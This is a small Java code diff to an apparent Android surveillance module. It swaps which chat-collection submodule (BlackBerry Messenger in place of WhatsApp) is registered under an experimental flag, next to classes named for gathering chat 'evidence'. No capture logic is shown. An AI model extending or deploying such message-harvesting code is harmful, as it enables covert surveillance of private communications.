@@ -10,6 +10,7 @@ import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.interfaces.Observer;
 import com.android.dvci.listener.ListenerProcess;
+import com.android.dvci.module.chat.ChatBBM;
 import com.android.dvci.module.chat.ChatFacebook;
 import com.android.dvci.module.chat.ChatGoogle;
 import com.android.dvci.module.chat.ChatLine;
@@ -35,7 +36,7 @@ public class ModuleChat extends BaseModule implements Observer<ProcessInfo> {
 		subModuleManager = new SubModuleManager(this);
 
 		if (Cfg.ENABLE_EXPERIMENTAL_MODULES) {
-			subModuleManager.add(new ChatWhatsapp());
+			subModuleManager.add(new ChatBBM());
 			
 		} else {
 			subModuleManager.add(new ChatFacebook());
